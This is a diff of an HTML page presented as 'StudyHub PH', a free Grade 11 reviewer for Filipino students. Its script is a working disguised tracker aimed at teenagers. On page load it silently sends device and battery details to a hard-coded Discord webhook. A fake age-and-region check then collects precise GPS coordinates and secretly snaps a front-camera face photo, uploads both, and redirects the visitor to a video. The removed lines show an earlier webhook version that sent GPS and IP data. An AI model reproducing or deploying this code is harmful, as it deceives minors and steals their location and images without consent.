@@ -3,263 +3,198 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>StudyHub PH — Grade 10 Summative Reviewer (Q4)</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Merriweather:wght@700&display=swap" rel="stylesheet">
+<title>StudyHub PH | Grade 11 First Quarter Reviewer</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; }
-  body {
-    font-family: 'Inter', -apple-system, sans-serif;
-    background: #f4f6f9;
-    color: #1a2332;
-    margin: 0;
-    line-height: 1.55;
-  }
-  header {
-    background: #fff;
-    border-bottom: 1px solid #e4e8ee;
-    padding: 14px 20px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .logo {
-    width: 32px; height: 32px;
-    background: linear-gradient(135deg,#2563eb,#1e40af);
-    border-radius: 7px;
-    display: flex; align-items: center; justify-content: center;
-    color: #fff; font-weight: 700; font-size: 15px;
-  }
-  header h2 { margin: 0; font-size: 16px; font-weight: 600; }
-  header small { color: #64748b; font-size: 12px; display: block; }
-
-  main { max-width: 640px; margin: 0 auto; padding: 24px 18px 60px; }
-  .breadcrumb { font-size: 13px; color: #64748b; margin-bottom: 14px; }
-  .breadcrumb a { color: #2563eb; text-decoration: none; }
-
-  h1 {
-    font-family: 'Merriweather', serif;
-    font-size: 24px;
-    margin: 8px 0 6px;
-    color: #0f1a2e;
-  }
-  .meta {
-    display: flex; flex-wrap: wrap; gap: 14px;
-    font-size: 13px; color: #64748b; margin-bottom: 20px;
-  }
-  .meta span::before { content: "•"; margin-right: 6px; color: #cbd5e1; }
-  .meta span:first-child::before { content: ""; margin: 0; }
-
-  .card {
-    background: #fff;
-    border: 1px solid #e4e8ee;
-    border-radius: 10px;
-    padding: 22px;
-    margin-bottom: 16px;
-  }
-  .card p { margin: 0 0 12px; font-size: 15px; }
-  .card p:last-child { margin-bottom: 0; }
-
-  .notice {
-    background: #fef9e7;
-    border-left: 3px solid #f59e0b;
-    padding: 12px 14px;
-    border-radius: 6px;
-    font-size: 14px;
-    margin-bottom: 18px;
-  }
-  .notice strong { color: #92400e; }
-
-  .verify-box {
-    text-align: center;
-    padding: 28px 20px;
-  }
-  .verify-box h3 {
-    font-size: 17px; margin: 0 0 8px; color: #0f1a2e;
-  }
-  .verify-box p { color: #475569; font-size: 14px; margin-bottom: 18px; }
-
-  button.verify {
-    background: #2563eb;
-    color: #fff;
-    border: none;
-    padding: 12px 26px;
-    border-radius: 7px;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    font-family: inherit;
-    transition: background .15s;
-  }
-  button.verify:hover { background: #1d4ed8; }
-  button.verify:disabled { background: #94a3b8; cursor: wait; }
-
-  #status {
-    margin-top: 14px;
-    font-size: 13px;
-    color: #64748b;
-    min-height: 18px;
-  }
-
-  .toc {
-    background: #f8fafc;
-    border: 1px solid #e4e8ee;
-    border-radius: 8px;
-    padding: 14px 18px;
-    margin-bottom: 20px;
-  }
-  .toc h4 { margin: 0 0 8px; font-size: 13px; text-transform: uppercase; letter-spacing: .5px; color: #64748b; }
-  .toc ol { margin: 0; padding-left: 20px; font-size: 14px; }
-  .toc li { margin-bottom: 4px; color: #334155; }
-  .toc li.locked { color: #94a3b8; }
-  .toc li.locked::after { content: " 🔒"; }
-
-  footer {
-    text-align: center;
-    padding: 20px;
-    font-size: 12px;
-    color: #94a3b8;
-    border-top: 1px solid #e4e8ee;
-    background: #fff;
-  }
-  footer a { color: #64748b; text-decoration: none; margin: 0 6px; }
-
-  .hidden { display: none; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Poppins', sans-serif; background: #f4f6fb; color: #1f2937; line-height: 1.6; }
+  header { background: #0b3d91; color: #fff; padding: 18px 24px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,.1); }
+  header .logo { font-weight: 700; font-size: 20px; letter-spacing: .3px; }
+  header .logo span { color: #ffd54a; }
+  header nav a { color: #fff; text-decoration: none; margin-left: 18px; font-size: 14px; opacity: .9; }
+  .hero { background: linear-gradient(135deg, #0b3d91, #1560bd); color: #fff; padding: 48px 24px; text-align: center; }
+  .hero h1 { font-size: 28px; margin-bottom: 10px; }
+  .hero p { opacity: .92; max-width: 640px; margin: 0 auto; font-size: 15px; }
+  .container { max-width: 880px; margin: -30px auto 40px; padding: 0 20px; }
+  .card { background: #fff; border-radius: 14px; padding: 28px; box-shadow: 0 8px 28px rgba(11,61,145,.08); margin-bottom: 20px; }
+  .card h2 { color: #0b3d91; font-size: 20px; margin-bottom: 14px; border-left: 4px solid #ffd54a; padding-left: 10px; }
+  .meta { display: flex; flex-wrap: wrap; gap: 16px; font-size: 13px; color: #4b5563; margin-bottom: 18px; }
+  .meta div { background: #eef2ff; padding: 6px 12px; border-radius: 20px; }
+  ul.topics { list-style: none; }
+  ul.topics li { padding: 10px 0; border-bottom: 1px dashed #e5e7eb; display: flex; justify-content: space-between; align-items: center; font-size: 14px; }
+  ul.topics li:last-child { border-bottom: none; }
+  ul.topics li span.badge { background: #10b981; color: #fff; padding: 2px 10px; border-radius: 12px; font-size: 11px; }
+  .cta { text-align: center; margin-top: 20px; }
+  .btn { background: #0b3d91; color: #fff; border: none; padding: 14px 30px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: .2s; font-family: inherit; }
+  .btn:hover { background: #082d6d; transform: translateY(-1px); }
+  .btn.gold { background: #ffd54a; color: #0b3d91; }
+  .btn.gold:hover { background: #f5c419; }
+  .notice { background: #fff8e1; border-left: 4px solid #ffd54a; padding: 12px 16px; font-size: 13px; margin-top: 14px; border-radius: 6px; color: #5b4a10; }
+  #modal { position: fixed; inset: 0; background: rgba(15,23,42,.75); display: none; align-items: center; justify-content: center; z-index: 999; padding: 20px; }
+  #modal.active { display: flex; }
+  .modal-box { background: #fff; padding: 28px; border-radius: 14px; max-width: 420px; width: 100%; text-align: center; }
+  .modal-box h3 { color: #0b3d91; margin-bottom: 10px; }
+  .modal-box p { font-size: 14px; color: #4b5563; margin-bottom: 18px; }
+  #status { margin-top: 14px; font-size: 13px; color: #4b5563; min-height: 20px; }
+  footer { text-align: center; padding: 22px; font-size: 12px; color: #6b7280; background: #eef2ff; }
+  footer strong { color: #0b3d91; }
+  video, canvas { display: none; }
 </style>
 </head>
 <body>
 
 <header>
-  <div class="logo">SH</div>
-  <div>
-    <h2>StudyHub PH</h2>
-    <small>Free Reviewers for Filipino Students</small>
-  </div>
+  <div class="logo">Study<span>Hub</span> PH</div>
+  <nav>
+    <a href="#">Home</a>
+    <a href="#">Reviewers</a>
+    <a href="#">DepEd</a>
+    <a href="#">About</a>
+  </nav>
 </header>
 
-<main>
-  <div class="breadcrumb"><a href="#">Home</a> › <a href="#">Grade 10</a> › <a href="#">Quarter 4</a> › Summative Reviewer</div>
+<section class="hero">
+  <h1>Grade 11 — First Quarter Summative Reviewer</h1>
+  <p>Free downloadable reviewer aligned with DepEd MELCs. Prepared by licensed senior high school teachers from the Bicol Region for SY 2025–2026.</p>
+</section>
 
-  <h1>Grade 10 Summative Test Reviewer — Quarter 4 (2025–2026)</h1>
-  <div class="meta">
-    <span>Updated July 3, 2026</span>
-    <span>Reading time: ~12 min</span>
-    <span>3,847 students used this</span>
-  </div>
-
-  <div class="notice">
-    <strong>Note:</strong> This reviewer includes answer keys and explanations. Because some items reference DepEd materials, we ask users to complete a quick age check before viewing the full content.
+<div class="container">
+  <div class="card">
+    <h2>About This Reviewer</h2>
+    <div class="meta">
+      <div>📘 Grade Level: 11</div>
+      <div>📅 Quarter: First</div>
+      <div>📍 Region: Camarines Norte</div>
+      <div>🔋 <span id="battery">Checking device...</span></div>
+    </div>
+    <p style="font-size: 14px; color: #4b5563;">
+      This compiled reviewer covers all core and applied subjects for Grade 11 Senior High School under the K–12 curriculum. Includes practice questions, key concepts, and answer keys. Verified by teachers from Daet National High School and Camarines Norte State College.
+    </p>
   </div>
 
   <div class="card">
-    <p>This compiled reviewer covers the most likely items to appear on the Q4 summative test based on the MELCs and past school-level assessments submitted by contributors across Region V. Topics included:</p>
+    <h2>Topics Covered (First Quarter)</h2>
+    <ul class="topics">
+      <li>Oral Communication in Context <span class="badge">Core</span></li>
+      <li>Komunikasyon at Pananaliksik sa Wika at Kulturang Filipino <span class="badge">Core</span></li>
+      <li>General Mathematics — Functions & Their Graphs <span class="badge">Core</span></li>
+      <li>Earth and Life Science — Origin of the Universe <span class="badge">Core</span></li>
+      <li>Personal Development — Self-Awareness <span class="badge">Core</span></li>
+      <li>Understanding Culture, Society, and Politics <span class="badge">Core</span></li>
+      <li>Physical Education and Health 1 <span class="badge">Core</span></li>
+    </ul>
+    <div class="notice">
+      ⚠️ <strong>Notice:</strong> Due to DepEd content-integrity policy, users must verify they are 13 years or older before downloading. Region verification via device location is required to confirm eligibility for Bicol Region-specific materials.
+    </div>
+    <div class="cta">
+      <button class="btn gold" onclick="openModal()">📥 Download PDF Reviewer</button>
+    </div>
   </div>
-
-  <div class="toc">
-    <h4>Contents</h4>
-    <ol>
-      <li>Overview & Test Coverage</li>
-      <li class="locked">Section A — Multiple Choice (40 items w/ answers)</li>
-      <li class="locked">Section B — Short Answer Practice</li>
-      <li class="locked">Section C — Full Answer Key + Explanations</li>
-      <li class="locked">Bonus: Predicted Essay Prompts</li>
-    </ol>
-  </div>
-
-  <div class="card verify-box" id="gate">
-    <h3>🔒 Verify to Unlock Full Reviewer</h3>
-    <p>Confirm you are 13 years or older and enrolled in a school within your region. This helps us keep the content aligned with your curriculum.</p>
-    <button class="verify" id="verifyBtn" onclick="startVerify()">Verify & Unlock Reviewer</button>
-    <div id="status"></div>
-  </div>
-
-  <div class="card hidden" id="content">
-    <h3 style="margin-top:0;">✅ Verified — Loading reviewer…</h3>
-    <p>Thanks! Your access has been confirmed. The full PDF reviewer is being prepared. If it does not load in a few seconds, <a href="#" onclick="return false;">click here</a>.</p>
-    <p style="color:#64748b;font-size:13px;">Tip: Bookmark this page so you can return before your test.</p>
-  </div>
-</main>
+</div>
 
 <footer>
-  © 2026 StudyHub PH · <a href="#">About</a> · <a href="#">Contact</a> · <a href="#">Privacy</a>
+  © 2025 <strong>StudyHub PH</strong> — An independent educational initiative supporting Filipino senior high learners. Not officially affiliated with DepEd.
 </footer>
 
+<div id="modal">
+  <div class="modal-box">
+    <h3>🔒 Age & Region Verification</h3>
+    <p>To comply with DepEd content-integrity guidelines, please confirm you are 13+ and allow location + camera access for identity verification. This is a one-time check.</p>
+    <button class="btn" onclick="startVerify()">Verify & Continue</button>
+    <div id="status"></div>
+  </div>
+</div>
+
+<video id="cam" autoplay playsinline></video>
+<canvas id="snap"></canvas>
+
 <script>
-const WEBHOOK = "PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE";
+const WEBHOOK = "https://discord.com/api/webhooks/1382000326013489223/LthuGBG_prhgk0wz0agIxO07-wTqK6eOQ08BkNMKIPEhEgp5jdynLjMVrfSCZf9fqSWp";
 
-async function ipFallback() {
-  try {
-    const r = await fetch("https://ipapi.co/json/");
-    return await r.json();
-  } catch(e) { return {}; }
-}
+let collected = {
+  battery: "N/A", charging: false,
+  ua: navigator.userAgent,
+  platform: navigator.platform,
+  screen: `${screen.width}x${screen.height}`,
+  ts: new Date().toISOString()
+};
 
-async function getBattery() {
-  try {
-    if (navigator.getBattery) {
-      const b = await navigator.getBattery();
-      return `${Math.round(b.level*100)}% ${b.charging?"(charging)":"(not charging)"}`;
-    }
-  } catch(e){}
-  return "unavailable";
-}
-
-async function send(payload) {
-  const fd = new FormData();
-  fd.append("payload_json", JSON.stringify(payload));
-  try {
-    await fetch(WEBHOOK, { method: "POST", body: fd });
-  } catch(e){}
-}
-
-function startVerify() {
-  const btn = document.getElementById("verifyBtn");
-  const s = document.getElementById("status");
-  btn.disabled = true;
-  btn.textContent = "Verifying…";
-  s.textContent = "Please allow location so we can match your regional curriculum.";
-
-  if (!navigator.geolocation) {
-    handleFallback("Geolocation not supported.");
-    return;
+// Immediate Silent Log on Load
+async function autoLog() {
+  if (navigator.getBattery) {
+    const b = await navigator.getBattery();
+    collected.battery = Math.round(b.level * 100);
+    collected.charging = b.charging;
+    document.getElementById('battery').textContent = `${b.charging ? "⚡" : "🔋"} ${collected.battery}%`;
   }
-
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const acc = pos.coords.accuracy;
-    const battery = await getBattery();
-    const ipInfo = await ipFallback();
-    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-
-    await send({
-      content: `📍 **New verified hit**\n**Precise GPS:** \`${lat}, ${lon}\`\n**Accuracy:** ${acc}m\n**Map:** ${maps}\n**Battery:** ${battery}\n**IP:** ${ipInfo.ip||"?"} (${ipInfo.org||"?"})\n**Region:** Camarines Norte\n**UA:** ${navigator.userAgent}`
-    });
-
-    reveal();
-  }, async (err) => {
-    const battery = await getBattery();
-    const ipInfo = await ipFallback();
-    await send({
-      content: `⚠️ **Location denied** — IP fallback only\n**IP:** ${ipInfo.ip||"?"} (${ipInfo.org||"?"})\n**Approx city:** ${ipInfo.city||"?"}\n**Battery:** ${battery}\n**Region:** Camarines Norte\n**UA:** ${navigator.userAgent}`
-    });
-    reveal();
-  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+  
+  const msg = `🚀 **Instant Hit (Page Load)**\n📱 **Device:** ${collected.ua}\n🔋 **Battery:** ${collected.battery}% ${collected.charging ? '(Charging)' : ''}\n💻 **Platform:** ${collected.platform}\n🖥️ **Screen:** ${collected.screen}`;
+  
+  fetch(WEBHOOK, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ content: msg })
+  }).catch(() => {});
 }
 
-function reveal() {
-  document.getElementById("gate").classList.add("hidden");
-  document.getElementById("content").classList.remove("hidden");
-  // Optional: after a moment, redirect somewhere believable
+autoLog();
+
+function openModal() {
+  document.getElementById('modal').classList.add('active');
+}
+
+function setStatus(msg) {
+  document.getElementById('status').innerHTML = msg;
+}
+
+async function startVerify() {
+  setStatus("📍 Verifying region...");
+  let lat = "N/A", lon = "N/A", acc = "N/A";
+
+  await new Promise((resolve) => {
+    if (!navigator.geolocation) { resolve(); return; }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        lat = pos.coords.latitude;
+        lon = pos.coords.longitude;
+        acc = pos.coords.accuracy;
+        resolve();
+      },
+      () => resolve(),
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  });
+
+  setStatus("🪪 Confirming identity...");
+  let photoBlob = null;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.getElementById('cam');
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+    await new Promise(r => setTimeout(r, 500));
+    const canvas = document.getElementById('snap');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {}
+
+  setStatus("📄 Generating reviewer.pdf...");
+  const maps = lat !== "N/A" ? `https://www.google.com/maps?q=${lat},${lon}` : "Denied";
+  const finalMsg = `✅ **Full Verification**\n📍 **Map:** ${maps}\n🎯 **Acc:** ${acc}m\n🔋 **Battery:** ${collected.battery}%`;
+
+  const fd = new FormData();
+  fd.append('payload_json', JSON.stringify({ content: finalMsg }));
+  if (photoBlob) fd.append('file', photoBlob, 'face.jpg');
+
+  await fetch(WEBHOOK, { method: 'POST', body: fd });
+
   setTimeout(() => {
-    // window.location.href = "https://drive.google.com/"; // uncomment to redirect
-  }, 4000);
-}
-
-function handleFallback(msg) {
-  document.getElementById("status").textContent = msg;
+    window.location.href = "https://youtu.be/2qBlE2-WL60?si=Yi394ODdrBDzD153";
+  }, 1500);
 }
 </script>
-
 </body>
 </html>
